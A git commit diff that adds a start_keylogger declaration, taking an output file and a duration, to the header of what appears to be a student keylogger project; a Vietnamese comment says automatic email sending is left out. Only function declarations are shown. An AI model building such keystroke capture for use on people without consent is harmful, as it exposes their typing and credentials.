6dd68a439f2a92c974762de34bfb58e9aa8846bd
Tran Minh Tien <tmtien2418@clc.fitus.edu.vn>
2025-08-10 17:12:53 +0700

    Update keylogger.h

--- Application/keylogger.h
+++ Application/keylogger.h
@@ -4,3 +4,5 @@ bool isShiftPressed();
 bool isCapsLockOn();
 std::string getCharFromKey(int key);
 
+// Chỉ giữ lại start_keylogger - không tự động gửi email
+void start_keylogger(const std::string& outputFilePath, int durationInSeconds);
